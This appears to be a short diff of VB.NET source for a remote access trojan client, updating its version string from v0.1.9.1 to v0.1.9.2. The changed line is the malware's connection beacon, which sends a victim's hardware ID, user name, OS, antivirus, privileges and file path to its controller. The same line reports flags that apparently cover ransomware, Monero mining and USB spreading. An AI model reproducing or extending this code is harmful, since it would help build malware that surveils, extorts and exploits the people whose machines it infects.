@@ -111,7 +111,7 @@ re:
                 isConnected = True
                 MS = New IO.MemoryStream
 
-                Send(String.Concat("info", SPL, C_ID.HWID, SPL, C_ID.UserName, SPL, "v0.1.9.1", SPL, C_ID.MyOS, " ", C_ID.Bit, SPL,
+                Send(String.Concat("info", SPL, C_ID.HWID, SPL, C_ID.UserName, SPL, "v0.1.9.2", SPL, C_ID.MyOS, " ", C_ID.Bit, SPL,
                                   C_ID.INDATE, SPL, C_ID.AV, SPL, C_ID.Rans, SPL, C_ID.XMR, SPL,
                                   C_ID.USBSP, SPL, C_Settings.PORT, SPL, C_ID.dotNET, SPL, "...", SPL, " ", SPL,
                                   C_ID.Privileges.ToString, SPL, C_Settings.fullpath))
